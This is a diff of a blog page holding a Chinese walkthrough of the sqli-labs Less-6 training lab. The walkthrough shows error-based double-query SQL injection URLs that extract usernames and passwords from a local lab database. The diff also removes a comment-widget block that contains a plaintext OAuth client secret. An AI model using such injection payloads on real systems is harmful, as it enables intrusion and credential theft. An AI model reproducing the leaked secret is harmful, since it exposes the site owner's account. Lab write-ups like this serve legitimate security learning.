@@ -32,7 +32,8 @@ http://192.168.150.128/sqli-labs-mas">
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
 <body>
@@ -442,8 +443,8 @@ http://192.168.150.128/sqli-labs-mas">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没有什么好解释的，同 Less5 ，只不过 “单引号” 换成了 “双引号”。</p>
-<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="双注入GET双引号字符型注入"><a href="#双注入GET双引号字符型注入" class="headerlink" title="双注入GET双引号字符型注入"></a>双注入GET双引号字符型注入</h2><ol>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没有什么好解释的，同 Less5 ，只不过 “单引号” 换成了 “双引号”。</p>
+<h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><h3 id="双注入GET双引号字符型注入"><a href="#双注入GET双引号字符型注入" class="headerlink" title="双注入GET双引号字符型注入"></a>双注入GET双引号字符型注入</h3><ol>
 <li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li>
 </ol>
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1"</code></pre><p><img src="https://i.loli.net/2019/10/05/o8WZNc9r7peLsjA.png" alt="less6-1.png"></p>
@@ -473,7 +474,7 @@ http://192.168.150.128/sqli-labs-mas">
 </ol>
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/Ve26puIBRHrD51J.png" alt="less6-11.png"></p>
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/Mfv81dRo2FGC39X.png" alt="less6-12.png"></p>
-<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8314700.html" target="_blank" rel="noopener">【sqli-labs】 less6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</a></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.cnblogs.com/omnis/p/8314700.html" target="_blank" rel="noopener">【sqli-labs】 less6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -523,28 +524,6 @@ http://192.168.150.128/sqli-labs-mas">
 
     
 
-    
-        <link rel="stylesheet" href="/libs/gitment/gitment-default.css">
-<link rel="stylesheet" href="/css/gitment.css">
-
-<div class="gitment-card card" data-aos="fade-up">
-    <div id="gitment-content" class="card-content"></div>
-</div>
-
-<script src="/libs/gitment/gitment.js"></script>
-<script>
-var gitment = new Gitment({
-    id: 'Sat Oct 05 2019 16:08:43 GMT+0800',
-    owner: '315053891',
-    repo: 'hhkk2334.github.io',
-    oauth: {
-        client_id: '2ba8ba1b984aa89bf7cf',
-        client_secret: 'eb1541997c7ddce00df527e897e7419e105f6b04'
-    }
-});
-
-gitment.render('gitment-content');
-</script>
     
 
     
@@ -844,5 +823,6 @@ gitment.render('gitment-content');
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
 
 
+<script src="/live2d-widget/autoload.js"></script>
 </body>
 </html>
